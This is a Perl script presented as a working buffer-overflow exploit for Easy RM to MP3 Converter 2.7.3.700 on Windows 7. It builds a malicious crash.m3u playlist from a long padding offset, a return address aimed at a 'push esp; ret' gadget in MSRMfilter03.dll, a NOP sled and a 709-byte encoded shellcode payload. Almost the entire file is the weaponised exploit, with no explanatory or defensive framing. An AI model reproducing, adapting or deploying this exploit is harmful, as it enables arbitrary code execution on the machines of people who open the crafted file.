#!/usr/bin/perl
#
# Working exploit for Easy RM to MP3 Converter 2.7.3.700
# tested on Windows 7

use strict;
use warnings;

my $file = "crash.m3u";
my $offset = "\x41"x26086;
my $eip = pack ("V", 0x1001b058);
my $nops = "\x90"x100;
#709 bytes
#found push esp; ret on MSRMfilter03.dll
my $payload =
"\xda\xc7\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a" .
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" .
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" .
"\x75\x4a\x49\x4b\x4c\x39\x78\x4f\x72\x35\x50\x75\x50\x73" .
"\x30\x73\x50\x4d\x59\x48\x65\x34\x71\x59\x50\x65\x34\x4e" .
"\x6b\x66\x30\x36\x50\x6c\x4b\x43\x62\x56\x6c\x4c\x4b\x62" .
"\x72\x37\x64\x4c\x4b\x54\x32\x74\x68\x76\x6f\x58\x37\x43" .
"\x7a\x65\x76\x66\x51\x4b\x4f\x6e\x4c\x57\x4c\x70\x61\x43" .
"\x4c\x47\x72\x56\x4c\x51\x30\x4f\x31\x48\x4f\x74\x4d\x43" .
"\x31\x79\x57\x49\x72\x69\x62\x56\x32\x36\x37\x6c\x4b\x30" .
"\x52\x32\x30\x6e\x6b\x70\x4a\x45\x6c\x4e\x6b\x50\x4c\x44" .
"\x51\x34\x38\x78\x63\x72\x68\x65\x51\x7a\x71\x53\x61\x6e" .
"\x6b\x53\x69\x55\x70\x53\x31\x4b\x63\x4c\x4b\x70\x49\x74" .
"\x58\x6a\x43\x46\x5a\x67\x39\x6e\x6b\x54\x74\x4e\x6b\x63" .
"\x31\x59\x46\x76\x51\x79\x6f\x6e\x4c\x49\x51\x58\x4f\x74" .
"\x4d\x67\x71\x4f\x37\x55\x68\x49\x70\x73\x45\x4a\x56\x57" .
"\x73\x31\x6d\x6b\x48\x37\x4b\x73\x4d\x66\x44\x30\x75\x39" .
"\x74\x31\x48\x6c\x4b\x66\x38\x76\x44\x63\x31\x39\x43\x52" .
"\x46\x6c\x4b\x46\x6c\x30\x4b\x6e\x6b\x70\x58\x47\x6c\x75" .
"\x51\x59\x43\x6e\x6b\x63\x34\x6c\x4b\x77\x71\x5a\x70\x4d" .
"\x59\x57\x34\x66\x44\x37\x54\x53\x6b\x53\x6b\x50\x61\x32" .
"\x79\x51\x4a\x32\x71\x79\x6f\x69\x70\x53\x6f\x31\x4f\x62" .
"\x7a\x4e\x6b\x42\x32\x7a\x4b\x6c\x4d\x33\x6d\x35\x38\x70" .
"\x33\x34\x72\x67\x70\x63\x30\x65\x38\x63\x47\x73\x43\x76" .
"\x52\x63\x6f\x56\x34\x33\x58\x62\x6c\x53\x47\x74\x66\x33" .
"\x37\x79\x6f\x49\x45\x58\x38\x4a\x30\x35\x51\x73\x30\x73" .
"\x30\x56\x49\x5a\x64\x62\x74\x70\x50\x43\x58\x31\x39\x6f" .
"\x70\x50\x6b\x35\x50\x79\x6f\x38\x55\x56\x30\x76\x30\x32" .
"\x70\x52\x70\x77\x30\x76\x30\x43\x70\x32\x70\x55\x38\x78" .
"\x6a\x36\x6f\x59\x4f\x6d\x30\x4b\x4f\x68\x55\x7a\x37\x53" .
"\x5a\x46\x65\x53\x58\x46\x6a\x65\x50\x63\x30\x45\x51\x31" .
"\x78\x63\x32\x67\x70\x47\x61\x33\x6c\x6b\x39\x4d\x36\x53" .
"\x5a\x54\x50\x56\x36\x66\x37\x31\x78\x4d\x49\x6f\x55\x42" .
"\x54\x30\x61\x6b\x4f\x4a\x75\x4c\x45\x4f\x30\x42\x54\x34" .
"\x4c\x49\x6f\x52\x6e\x36\x68\x43\x45\x58\x6c\x63\x58\x38" .
"\x70\x4e\x55\x79\x32\x52\x76\x69\x6f\x68\x55\x42\x48\x51" .
"\x73\x52\x4d\x53\x54\x73\x30\x4d\x59\x58\x63\x50\x57\x50" .
"\x57\x73\x67\x54\x71\x6c\x36\x61\x7a\x75\x42\x72\x79\x76" .
"\x36\x79\x72\x6b\x4d\x63\x56\x4b\x77\x53\x74\x47\x54\x35" .
"\x6c\x46\x61\x55\x51\x6e\x6d\x72\x64\x46\x44\x64\x50\x69" .
"\x56\x63\x30\x77\x34\x32\x74\x36\x30\x63\x66\x72\x76\x46" .
"\x36\x47\x36\x42\x76\x52\x6e\x31\x46\x73\x66\x42\x73\x43" .
"\x66\x30\x68\x63\x49\x5a\x6c\x37\x4f\x6b\x36\x39\x6f\x68" .
"\x55\x4e\x69\x6b\x50\x42\x6e\x62\x76\x51\x56\x6b\x4f\x76" .
"\x50\x30\x68\x44\x48\x6f\x77\x47\x6d\x73\x50\x69\x6f\x5a" .
"\x75\x6f\x4b\x6c\x30\x4d\x65\x69\x32\x53\x66\x32\x48\x4d" .
"\x76\x4f\x65\x6f\x4d\x4f\x6d\x69\x6f\x4b\x65\x57\x4c\x76" .
"\x66\x33\x4c\x36\x6a\x6f\x70\x6b\x4b\x69\x70\x71\x65\x33" .
"\x35\x6d\x6b\x37\x37\x72\x33\x42\x52\x72\x4f\x31\x7a\x33" .
"\x30\x70\x53\x59\x6f\x6b\x65\x41\x41";
my $suffix = "\x43"x3101;

my $junk = $offset.$eip.$nops.$payload.$suffix;
open (FILE,">$file");
print FILE $junk;
close (FILE);
